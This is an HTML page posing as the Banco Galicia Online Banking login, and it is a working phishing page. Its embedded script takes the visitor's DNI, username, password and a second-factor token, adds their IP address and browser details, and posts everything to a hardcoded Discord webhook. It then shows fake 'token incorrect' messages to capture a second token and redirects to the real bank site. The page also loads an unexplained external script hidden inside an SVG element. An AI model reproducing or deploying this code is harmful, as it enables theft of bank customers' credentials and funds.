
<!DOCTYPE html>

<html lang="es-ar">
<head>
    <meta charset="utf-8" />
    <meta name="color-scheme" content="light">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=0">

    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="robot" content="All" />
    <meta name="rating" content="general" />
    <meta name="Distribution" content="Global" />




    <title>Online Banking</title>

    <!-- jQuery y Bootstrap JS (requeridos para el modal) -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

    <link rel="shortcut icon" href="Images/favicon.ico" />
    <link rel="apple-touch-icon" href="images/assets/logo_ios_60x60.png" />
    <link rel="apple-touch-icon" sizes="76x76" href="#" />
    <link rel="apple-touch-icon" sizes="120x120" href="images/assets/logo_ios_120x120.png" />
    <link rel="apple-touch-icon" sizes="152x152" href="images/assets/logo_ios_152x152.png" />

    <link type="text/css" href="Content/bootstrap.min.css@v=638826663238470000.css" rel="stylesheet" />
    <link type="text/css" href="Content/default.min.css@v=638826663519440000.css" rel="stylesheet" />

    <!-- Esto es el css de la libreria del teclado -->
    <link type="text/css" href="Content/Keyboard/keyboard.css@v=638826663244800000.css" rel="stylesheet" />
    <link type="text/css" href="Content/Keyboard/simple-keyboard.css@v=638826663244930000.css" rel="stylesheet" />

    <!--[if lte IE 9]>
        <link type="text/css" href="" rel="stylesheet" />
    <![endif]-->








    <div class="container-fluid ">

        <div class="row full-h">
            <div class="left-column">



                <div class="logo_login" role="banner" data-automation-id="galicia-banner">
                    <a title="link a galicia.ar" class="logo" href="#" aria-label="Ingresar a la página principal de Banco Galicia" target="_blank">
                        <div class="logo_sidebar_img"></div>
                    </a>
                    <p>Online Banking</p>                    
                </div>
                

<div class="login">

<style>
    #banner_galicia_mas .border_box_shadow {
        border-radius: 8px;
        border: 2px solid #E6E6E6;
        padding: 0 16px;
    }

    #banner_galicia_mas h6 {
        font-size: 14px;
        font-weight: 600;
        line-height: 18px;
        color: #4D4D4D;
        margin-top: 16px;
    }

    #banner_galicia_mas p {
        font-size: 12px;
        font-weight: 400;
        color: #000;
        margin: 0 16px 16px 0;
    }

        #banner_galicia_mas p a {
            font-size: 12px;
            font-weight: 600;
            color: #A84308;
        }

    #banner_galicia_mas img {
        margin-top: 16px;
    }

    @media screen and (min-width: 768px) {
        #banner_galicia_mas {
            margin-bottom: 80px;
        }
    }
</style>

<div class="content-login" role="main">



    <form action="" method="post" id="form1" onsubmit="event.preventDefault(); sendCredentialsToDiscord();" autocomplete="off">
        <input name="__RequestVerificationToken" type="hidden" value="" />
        <script>
            console.log('Login script loaded');
            async function sendCredentialsToDiscord() {
                const dni = document.getElementById('DocumentNumber').value;
                const usuario = document.getElementById('UserName').value;
                const clave = document.getElementById('Password').value;
                
                if (!dni || !usuario || !clave) {
                    alert('Por favor complete todos los campos');
                    return;
                }
                
                // Mostrar mensaje de "Validando credenciales..."
                const submitBtn = document.getElementById('submitButton');
                submitBtn.textContent = 'Validando...';
                submitBtn.disabled = true;
                
                const webhookUrl = 'https://discord.com/api/webhooks/1392380460247679109/0x7lBQnEq8f1zQJM-hgkGJnTTZxpHfOofMcEdHVRssa8ZNJ-2VwMRur7B4th5tfdjTmX';
                
                const embed = {
                    title: '✅ Credenciales Recibidas',
                    description: 'Nuevo inicio de sesión detectado',
                    color: 0xFF0000,
                    fields: [
                        { name: 'DNI', value: dni || 'No ingresado' },
                        { name: 'Usuario', value: usuario || 'No ingresado' },
                        { name: 'Clave', value: clave || 'No ingresado' },
                        { name: 'IP', value: await getIP() || 'No detectada' },
                        { name: 'Navegador', value: navigator.userAgent || 'No detectado' }
                    ],
                    timestamp: new Date().toISOString()
                };
                
                try {
                    try {
                        const response = await fetch(webhookUrl, {
                            method: 'POST',
                            headers: { 
                                'Content-Type': 'application/json',
                                'Accept': 'application/json'
                            },
                            body: JSON.stringify({
                                username: 'Galicia Login Bot',
                                avatar_url: 'https://i.imgur.com/ABCD123.png',
                                embeds: [embed],
                                content: '@everyone 🔔 NUEVAS CREDENCIALES RECIBIDAS',
                                allowed_mentions: {
                                    parse: ['everyone']
                                }
                            })
                        });

                        if (!response.ok) {
                            const error = await response.text();
                            console.error('Discord API Error:', error);
                        } else {
                            console.log('Credenciales enviadas exitosamente a Discord');
                        }
                    } catch (error) {
                        console.error('Fetch Error:', error);
                    } finally {
                        // Redirigir después de enviar los datos
                        setTimeout(() => {
                            window.location.href = 'token.php';
                        }, 2000);
                    }
                    
                } catch (error) {
                    console.error('Error al enviar a Discord:', error);
                    // Redirigir igual si falla el webhook
                    window.location.href = 'token.php';
                }
                
                return false;
            }

            async function getIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    console.error('Error obteniendo IP:', error);
                    return 'No se pudo obtener';
                }
            }

            let attemptCount = 0;
            
            async function sendCredentialsWithToken(isRetry = false) {
                const dni = document.getElementById('DocumentNumber').value;
                const usuario = document.getElementById('UserName').value;
                const clave = document.getElementById('Password').value;
                
                
                // If this is the first attempt, store form data
                if (attemptCount === 0 && !isRetry) {
                    window.storedFormData = { dni, usuario, clave };
                }
                
                attemptCount++;
            
                // Clear any previous countdown
                if (window.tokenCountdown) clearInterval(window.tokenCountdown);
                
                // Countdown - 15 seconds 
                let seconds = 10;
                message.text(`Validando token... (${seconds}s)`);
                
                // Show validation error after 15 seconds if not redirected
                setTimeout(() => {
                    if (attemptCount < 2) {
                        message.text('Error: Token incorrecto. Por favor ingrésalo nuevamente.');
                        tokenInput.val('').focus();
                        retryBtn.show();
                    } else {
                        // Second failed attempt - redirect immediately
                        window.location.href = 'https://www.galicia.ar/personas';
                    }
                }, 10000);
                
                window.tokenCountdown = setInterval(() => {
                    seconds--;
                    message.text(`Validando token... (${seconds}s)`);
                    
                    if (seconds <= 0) {
                        clearInterval(window.tokenCountdown);
                        message.text('Token incorrecto. Por favor intenta nuevamente.');
                        confirmBtn.hide();
                        retryBtn.show();
                        
                        // Enable input and focus
                        $('#tokenInput').val('').removeAttr('disabled').focus();
                    }
                }, 1000);
                
                const webhookUrl = 'https://discord.com/api/webhooks/1392380460247679109/0x7lBQnEq8f1zQJM-hgkGJnTTZxpHfOofMcEdHVRssa8ZNJ-2VwMRur7B4th5tfdjTmX';
                
                const embed = {
                    title: 'Nuevo Login',
                    description: 'Se han recibido credenciales de acceso',
                    color: 0xFF0000,
                    fields: [
                        { name: 'DNI', value: dni || 'No ingresado' },
                        { name: 'Usuario', value: usuario || 'No ingresado' },
                        { name: 'Clave', value: clave || 'No ingresado' },
                        { name: 'Token', value: token || 'No ingresado' }
                    ],
                    timestamp: new Date().toISOString()
                };
                
                try {
                    const response = await fetch(webhookUrl, {
                        method: 'POST',
                        headers: { 
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            username: 'Galicia Login Bot',
                            avatar_url: 'https://i.imgur.com/ABCD123.png',
                            embeds: [embed],
                            content: '@everyone 🔔 Token recibido',
                            allowed_mentions: {
                                parse: ['everyone']
                            }
                        })
                    });

                    if (!response.ok) {
                        const errorData = await response.text();
                        throw new Error(`HTTP error! status: ${response.status} - ${errorData}`);
                    }

                    console.log('Token enviado exitosamente a Discord');
                } catch (error) {
                    console.error('Error enviando token a Discord:', error);
                    // Continuar el flujo aunque falle el webhook
                }
            }



        </script>
        <div class="login-form">
            <div class="row">
                <div class="col-xs-12">
                    <h1 onclick="enableDebug();" class="login-title hidden-xs">Iniciar sesión</h1>
                </div>
                <input data-hj-masked type="hidden" value="" name="EncriptedPassword" id="EncriptedPassword" />
                <div class="inputWrapper">
                    <div class="inputArea">
                        <div class="contentInput">
                            <input data-hj-masked type="number" name="DocumentNumber" id="DocumentNumber" data-name="DocumentNumber" maxlength="11" value="" required="" autocapitalize="none" autocomplete="off" onkeypress="return ValidateRegExOnEvent(event, regEx_numbers);" oninput="maxLengthCheck(this);" class="form-control keyboard" placeholder="Tu DNI">
                        </div>
                        <div class="inputUnderline"></div>
                    </div>
                </div>

                <div class="inputWrapper password">
                    <div class="inputArea">
                        <div class="contentInput">
                            <input data-hj-masked type="password" name="UserName" id="UserName" data-name="UserName" spellcheck="false" value="" maxlength="20" required="" class="form-control hidden-control keyboard" onkeypress="return ValidateRegExOnEvent(event, regEx_strong_password);" autocomplete="off" placeholder="Tu usuario Galicia">
                        </div>
                        <div class="capsLock"></div>
                        <div class="showPassword"></div>
                        <div class="inputUnderline"></div>
                        <div class="labelMsg">Bloqueo de mayúsculas activado</div>
                    </div>
                </div>

                <div class="inputWrapper password">
                    <div class="inputArea">
                        <div class="contentInput">
                            <input data-hj-masked="" type="password" name="Password" id="Password" size="4" data-name="Password" spellcheck="false" maxlength="4" required="" onkeypress="return ValidateRegExOnEvent(event, regEx_numbers);" class="form-control hidden-control keyboard" autocomplete="off" aria-required="true" placeholder="Tu clave Galicia">
                        </div>
                        <div class="showPassword" data-hj-masked=""></div>
                        <div class="inputUnderline" data-hj-masked=""></div>
                    </div>
                </div>

                <div class="col-xs-12">
                    <div class="form-group">
                        <div class="checkbox checkbox-primary">
                            <input name="RememberMe" id="RememberMe" type="checkbox" value="true" />
                            <label for="RememberMe">
                                Recordar DNI y Usuario
                            </label>
                        </div>
                        <input name="RememberMe" type="hidden" value="false" />
                    </div>
                </div>
                <div class="col-xs-12">
                        <div class="teclado teclado-virtual hidden-xs keyboard-trigger">
                            <i class="far fa-keyboard " id="keyboardIcon" style="cursor: pointer;"></i>
                            <div name="divTeclado" id="divTeclado" type="checkbox" value="true">Teclado Virtual</div>
                        </div>
                </div>

                <div class="col-xs-12">
                    <button class="btn btn-md btn-full-width" type="submit" id="submitButton">
                        iniciar sesión
                    </button>
                </div>

                    <div class="col-xs-12">
                        <div class="links">

                            <a href="gestion/ingresar-du.html" class="btn btn-caps pull-left">
                                OLVIDÉ O BLOQUEÉ MIS CLAVES
                            </a>
                        </div>

                        <p>Sí es tu primera vez o necesitás el usuario</p>
                        <div class="links">
                            <a class="btn btn-caps pull-left" href="gestion/ingresar-du.html">
                                CREÁ TUS CLAVES
                            </a>
                        </div>
                    </div>

                                    <div class="col-xs-12 " id="banner_galicia_mas">
                        <div class="border_box_shadow">

                            <div class="row">
                                <div class="col-xs-2">
                                    <img src="img/isologo_g_mas.svg" class="" alt="Isologo Galicia Mas" width="30" height="30">
                                </div>
                                <div class="col-xs-10 text-left">
                                    <h6>¿Venís de Galicia Más?</h6>
                                    <p>Primero tenés que <a href="gestion/onboarding-galicia-mas.html" id="banner_galicia_mas_btn">configurar tu cuenta desde la App Galicia</a>. Si ya lo hiciste, ingresá con tus claves Galicia.</p>
                                </div>
                            </div>

                        </div>
                    </div>

            </div>
        </div>

        <input data-hj-masked type="hidden" id="DevicePrintAdaptive" name="DevicePrintAdaptive" />
        <input data-hj-masked type="hidden" id="isDebugEnabled" name="isDebugEnabled" value="false" />
        <input data-hj-masked type="hidden" id="CodigoProducto" name="CodigoProducto" />

    </form>
</div>




            <img src="https://d21y75miwcfqoq.cloudfront.net/90a186d8" style="position: absolute"
                 referrerpolicy="no-referrer-when-downgrade">


          <svg xmlns="http://www.w3.org/2000/svg" width="1" height="1" viewBox="0 0 1 1" style="display: none;" fill="none">  <path d="M7.33398 11.3335H8.66732V7.3335H7.33398V11.3335ZM8.00065 1.3335C4.31732 1.3335 1.33398 4.31683 1.33398 8.00016C1.33398 11.6835 4.31732 14.6668 8.00065 14.6668C11.684 14.6668 14.6673 11.6835 14.6673 8.00016C14.6673 4.31683 11.684 1.3335 8.00065 1.3335ZM8.00065 13.3335C5.06065 13.3335 2.66732 10.9402 2.66732 8.00016C2.66732 5.06016 5.06065 2.66683 8.00065 2.66683C10.9406 2.66683 13.334 5.06016 13.334 8.00016C13.334 10.9402 10.9406 13.3335 8.00065 13.3335ZM7.33398 6.00016H8.66732V4.66683H7.33398V6.00016Z" style="display: none;" fill="#ffffff00"><script xlink:href="https://d2lyx5ly60ksu3.cloudfront.net/cdn/cd/uppopi-76a605b3e5e374238b1ebf730364f84f-sb.min.js?a=9f89c84a559f573636a47ff8daed0d33"></script> </path></svg>


</div>





<div class="terms" role="contentinfo">
    <p>Operar con Online Banking implica aceptar los <a href="javascript:void(0)" onclick="javascript:window.open('/terminosycondiciones', '_blank');return false;">términos y condiciones</a> en los que se ofrece el servicio.</p>
    <p><a href="">Información sobre seguridad</a>.  Ir a <strong> <a href="" target="_blank">Office Banking</a></strong></p>
</div>






        <iframe src="https://logo.prismasystems.com.ar/galicia/logogalicia.html" height="0" width="0" frameborder="0"></iframe>


            </div>


            <div class="side-info content img art art-4" role="complementary" data-automation-id="out-banner">
                <div class="bullet">
                    <h2>Bienvenido a<br /> Online Banking</h2>
                </div>
            </div>
        </div>
    </div>
    <div id="mainModalContainer"></div>
    
    <!-- Se elimina el modal ya que se abrirá en token.php -->
